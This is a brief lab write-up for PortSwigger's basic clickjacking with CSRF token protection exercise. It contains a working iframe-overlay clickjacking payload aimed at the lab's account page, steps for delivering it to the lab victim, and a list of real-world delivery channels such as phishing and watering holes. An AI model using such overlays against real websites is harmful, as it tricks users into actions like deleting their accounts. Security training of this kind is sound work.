Is the malicious practice of manipulating a website user's activity by concealing hyperlinks beneath legitimate clickable content, thereby causing the user to perform actions of which they are unaware.

## Basic Clickjacking with CSRF Token Protection
[Lab: Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)
Clickjacking attacks use CSS to create and manipulate layers. The attacker incorporates the target website as an `iframe` layer overlaid on the decoy website. A sample simple payload for clickjacking is shown below:
```html
<style>
    iframe {
        position:relative;
        width:500px;
        height:500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:50px;
        left:50px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0abe004a04007f8980d403d20049002b.web-security-academy.net/my-account"></iframe>
```
#### Solving The Lab
Copy the **payload** above, you can login with the `wiener:peter` credentials and go to the exploit server. In the **Body** part of the exploit server, paste the payload. You can freely adjust the values of the properties in it. PortSwigger states to never click the **Delete account** button, or you will have to wait **20 mins.** to do a reset of the lab. Click **Store** then **Deliver the exploit to victim** and wait a few minutes and the lab will be solved.
##### Real-World Setting
In a real-world setting, attackers often use **Command-and-Control (C2)** to deliver the exploit to the victim. The methods are through **Phishing emails**, **Malicious ads**, **Compromised legitimate website**, **SEO poisoning**, or **Social media posts**. Other methods like **Watering Hole Attacks** where an attacker compromise a website that targets often visits, **XSS to Clickjacking Combo**, and **Open-Redirect Chain**.
